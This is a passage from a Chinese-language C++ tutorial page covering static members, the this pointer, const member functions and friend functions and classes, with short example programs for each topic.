name, string pName) :<span class="built_in">m_Name</span>(name), <span class="built_in">m_Phone</span>(pName)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Person构造&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	~<span class="built_in">Person</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Person析构&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">playGame</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; m_Name &lt;&lt; <span class="string">&quot; 使用&quot;</span> &lt;&lt; m_Phone.m_PhoneName &lt;&lt; <span class="string">&quot; 牌手机! &quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	string m_Name;</span><br><span class="line">	Phone m_Phone;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//当类中成员是其他类对象时，我们称该成员为 对象成员</span></span><br><span class="line">	<span class="comment">//构造的顺序是 ：先调用对象成员的构造，再调用本类构造</span></span><br><span class="line">	<span class="comment">//析构顺序与构造相反</span></span><br><span class="line">	<span class="function">Person <span class="title">p</span><span class="params">(<span class="string">&quot;张三&quot;</span> , <span class="string">&quot;苹果X&quot;</span>)</span></span>;</span><br><span class="line">	p.<span class="built_in">playGame</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>











<h4 id="4-2-8-静态成员"><a href="#4-2-8-静态成员" class="headerlink" title="4.2.8 静态成员"></a>4.2.8 静态成员</h4><p>静态成员就是在成员变量和成员函数前加上关键字static，称为静态成员</p>
<p>静态成员分为：</p>
<ul>
<li>静态成员变量<ul>
<li>所有对象共享同一份数据</li>
<li>在编译阶段分配内存</li>
<li>类内声明，类外初始化</li>
</ul>
</li>
<li>静态成员函数<ul>
<li>所有对象共享同一个函数</li>
<li>静态成员函数只能访问静态成员变量</li>
</ul>
</li>
</ul>
<p><strong>示例1 ：</strong>静态成员变量</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> m_A; <span class="comment">//静态成员变量</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//静态成员变量特点：</span></span><br><span class="line">	<span class="comment">//1 在编译阶段分配内存</span></span><br><span class="line">	<span class="comment">//2 类内声明，类外初始化</span></span><br><span class="line">	<span class="comment">//3 所有对象共享同一份数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> m_B; <span class="comment">//静态成员变量也是有访问权限的</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> Person::m_A = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> Person::m_B = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//静态成员变量两种访问方式</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//1、通过对象</span></span><br><span class="line">	Person p1;</span><br><span class="line">	p<span class="number">1.</span>m_A = <span class="number">100</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p1.m_A = &quot;</span> &lt;&lt; p<span class="number">1.</span>m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	Person p2;</span><br><span class="line">	p<span class="number">2.</span>m_A = <span class="number">200</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p1.m_A = &quot;</span> &lt;&lt; p<span class="number">1.</span>m_A &lt;&lt; endl; <span class="comment">//共享同一份数据</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p2.m_A = &quot;</span> &lt;&lt; p<span class="number">2.</span>m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、通过类名</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;m_A = &quot;</span> &lt;&lt; Person::m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//cout &lt;&lt; &quot;m_B = &quot; &lt;&lt; Person::m_B &lt;&lt; endl; //私有权限访问不到</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>示例2：</strong>静态成员函数</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="comment">//静态成员函数特点：</span></span><br><span class="line">	<span class="comment">//1 程序共享一个函数</span></span><br><span class="line">	<span class="comment">//2 静态成员函数只能访问静态成员变量</span></span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;func调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">		m_A = <span class="number">100</span>;</span><br><span class="line">		<span class="comment">//m_B = 100; //错误，不可以访问非静态成员变量</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> m_A; <span class="comment">//静态成员变量</span></span><br><span class="line">	<span class="type">int</span> m_B; <span class="comment">// </span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">	<span class="comment">//静态成员函数也是有访问权限的</span></span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;func2调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> Person::m_A = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//静态成员变量两种访问方式</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//1、通过对象</span></span><br><span class="line">	Person p1;</span><br><span class="line">	p<span class="number">1.f</span>unc();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、通过类名</span></span><br><span class="line">	Person::<span class="built_in">func</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//Person::func2(); //私有权限访问不到</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h3 id="4-3-C-对象模型和this指针"><a href="#4-3-C-对象模型和this指针" class="headerlink" title="4.3 C++对象模型和this指针"></a>4.3 C++对象模型和this指针</h3><h4 id="4-3-1-成员变量和成员函数分开存储"><a href="#4-3-1-成员变量和成员函数分开存储" class="headerlink" title="4.3.1 成员变量和成员函数分开存储"></a>4.3.1 成员变量和成员函数分开存储</h4><p>在C++中，类内的成员变量和成员函数分开存储</p>
<p>只有非静态成员变量才属于类的对象上</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		mA = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//非静态成员变量占对象空间</span></span><br><span class="line">	<span class="type">int</span> mA;</span><br><span class="line">	<span class="comment">//静态成员变量不占对象空间</span></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> mB; </span><br><span class="line">	<span class="comment">//函数也不占对象空间，所有函数共享一个函数实例</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mA &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//静态成员函数也不占对象空间</span></span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">sfunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="built_in">sizeof</span>(Person) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>







<h4 id="4-3-2-this指针概念"><a href="#4-3-2-this指针概念" class="headerlink" title="4.3.2 this指针概念"></a>4.3.2 this指针概念</h4><p>通过4.3.1我们知道在C++中成员变量和成员函数是分开存储的</p>
<p>每一个非静态成员函数只会诞生一份函数实例，也就是说多个同类型的对象会共用一块代码</p>
<p>那么问题是：这一块代码是如何区分那个对象调用自己的呢？</p>
<p>c++通过提供特殊的对象指针，this指针，解决上述问题。<strong>this指针指向被调用的成员函数所属的对象</strong></p>
<p>this指针是隐含每一个非静态成员函数内的一种指针</p>
<p>this指针不需要定义，直接使用即可</p>
<p>this指针的用途：</p>
<ul>
<li>当形参和成员变量同名时，可用this指针来区分</li>
<li>在类的非静态成员函数中返回对象本身，可使用return *this</li>
</ul>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//1、当形参和成员变量同名时，可用this指针来区分</span></span><br><span class="line">		<span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person&amp; <span class="title">PersonAddPerson</span><span class="params">(Person p)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;age += p.age;</span><br><span class="line">		<span class="comment">//返回对象本身</span></span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p1.age = &quot;</span> &lt;&lt; p<span class="number">1.</span>age &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">	p<span class="number">2.</span><span class="built_in">PersonAddPerson</span>(p1).<span class="built_in">PersonAddPerson</span>(p1).<span class="built_in">PersonAddPerson</span>(p1);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p2.age = &quot;</span> &lt;&lt; p<span class="number">2.</span>age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h4 id="4-3-3-空指针访问成员函数"><a href="#4-3-3-空指针访问成员函数" class="headerlink" title="4.3.3 空指针访问成员函数"></a>4.3.3 空指针访问成员函数</h4><p>C++中空指针也是可以调用成员函数的，但是也要注意有没有用到this指针</p>
<p>如果用到this指针，需要加以判断保证代码的健壮性</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//空指针访问成员函数</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">ShowClassName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;我是Person类!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">ShowPerson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span> == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; mAge &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> mAge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person * p = <span class="literal">NULL</span>;</span><br><span class="line">	p-&gt;<span class="built_in">ShowClassName</span>(); <span class="comment">//空指针，可以调用成员函数</span></span><br><span class="line">	p-&gt;<span class="built_in">ShowPerson</span>();  <span class="comment">//但是如果成员函数中用到了this指针，就不可以了</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h4 id="4-3-4-const修饰成员函数"><a href="#4-3-4-const修饰成员函数" class="headerlink" title="4.3.4 const修饰成员函数"></a>4.3.4 const修饰成员函数</h4><p><strong>常函数：</strong></p>
<ul>
<li>成员函数后加const后我们称为这个函数为<strong>常函数</strong></li>
<li>常函数内不可以修改成员属性</li>
<li>成员属性声明时加关键字mutable后，在常函数中依然可以修改</li>
</ul>
<p><strong>常对象：</strong></p>
<ul>
<li>声明对象前加const称该对象为常对象</li>
<li>常对象只能调用常函数</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		m_A = <span class="number">0</span>;</span><br><span class="line">		m_B = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//this指针的本质是一个指针常量，指针的指向不可修改</span></span><br><span class="line">	<span class="comment">//如果想让指针指向的值也不可以修改，需要声明常函数</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">ShowPerson</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		<span class="comment">//const Type* const pointer;</span></span><br><span class="line">		<span class="comment">//this = NULL; //不能修改指针的指向 Person* const this;</span></span><br><span class="line">		<span class="comment">//this-&gt;mA = 100; //但是this指针指向的对象的数据是可以修改的</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//const修饰成员函数，表示指针指向的内存空间的数据不能修改，除了mutable修饰的变量</span></span><br><span class="line">		<span class="keyword">this</span>-&gt;m_B = <span class="number">100</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">MyFunc</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		<span class="comment">//mA = 10000;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">	<span class="keyword">mutable</span> <span class="type">int</span> m_B; <span class="comment">//可修改 可变的</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//const修饰对象  常对象</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> Person person; <span class="comment">//常量对象  </span></span><br><span class="line">	cout &lt;&lt; person.m_A &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//person.mA = 100; //常对象不能修改成员变量的值,但是可以访问</span></span><br><span class="line">	person.m_B = <span class="number">100</span>; <span class="comment">//但是常对象可以修改mutable修饰成员变量</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//常对象访问成员函数</span></span><br><span class="line">	person.<span class="built_in">MyFunc</span>(); <span class="comment">//常对象不能调用const的函数</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>








<h3 id="4-4-友元"><a href="#4-4-友元" class="headerlink" title="4.4 友元"></a>4.4 友元</h3><p>生活中你的家有客厅(Public)，有你的卧室(Private)</p>
<p>客厅所有来的客人都可以进去，但是你的卧室是私有的，也就是说只有你能进去</p>
<p>但是呢，你也可以允许你的好闺蜜好基友进去。</p>
<p>在程序里，有些私有属性 也想让类外特殊的一些函数或者类进行访问，就需要用到友元的技术</p>
<p>友元的目的就是让一个函数或者类 访问另一个类中私有成员</p>
<p>友元的关键字为  &#x3D;&#x3D;friend&#x3D;&#x3D;</p>
<p>友元的三种实现</p>
<ul>
<li>全局函数做友元</li>
<li>类做友元</li>
<li>成员函数做友元</li>
</ul>
<h4 id="4-4-1-全局函数做友元"><a href="#4-4-1-全局函数做友元" class="headerlink" title="4.4.1 全局函数做友元"></a>4.4.1 全局函数做友元</h4><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//告诉编译器 goodGay全局函数 是 Building类的好朋友，可以访问类中的私有内容</span></span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">goodGay</span><span class="params">(Building * building)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Building</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_SittingRoom; <span class="comment">//客厅</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	string m_BedRoom; <span class="comment">//卧室</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">goodGay</span><span class="params">(Building * building)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问： &quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问： &quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Building b;</span><br><span class="line">	<span class="built_in">goodGay</span>(&amp;b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="4-4-2-类做友元"><a href="#4-4-2-类做友元" class="headerlink" title="4.4.2 类做友元"></a>4.4.2 类做友元</h4><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">goodGay</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">goodGay</span>();</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">visit</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	Building *building;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//告诉编译器 goodGay类是Building类的好朋友，可以访问到Building类中私有内容</span></span><br><span class="line">	<span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">goodGay</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Building</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_SittingRoom; <span class="comment">//客厅</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	string m_BedRoom;<span class="comment">//卧室</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Building::<span class="built_in">Building</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">goodGay::<span class="built_in">goodGay</span>()</span><br><span class="line">&#123;</span><br><span class="line">	building = <span class="keyword">new</span> Building;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">goodGay::visit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	goodGay gg;</span><br><span class="line">	gg.<span class="built_in">visit</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h4 id="4-4-3-成员函数做友元"><a href="#4-4-3-成员函数做友元" class="headerlink" title="4.4.3 成员函数做友元"></a>4.4.3 成员函数做友元</h4><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">goodGay</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">goodGay</span>();</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">visit</span><span class="params">()</span></span>; <span class="comment">//只让visit函数作为Building的好朋友，可以发访问Building中私有内容</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">visit2</span><span class="params">()</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	Building *building;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//告诉编译器  goodGay类中的visit成员函数 是Building好朋友，可以访问私有内容</span></span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">goodGay::visit</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Building</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_SittingRoom; <span class="comment">//客厅</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	string m_BedRoom;<span class="comment">//卧室</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Building::<span class="built_in">Building</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">goodGay::<span class="built_in">goodGay</span>()</span><br><span class="line">&#123;</span><br><span class="line">	building = <span class="keyword">new</span> Building;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">goodGay::visit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">goodGay::visit2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//cout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 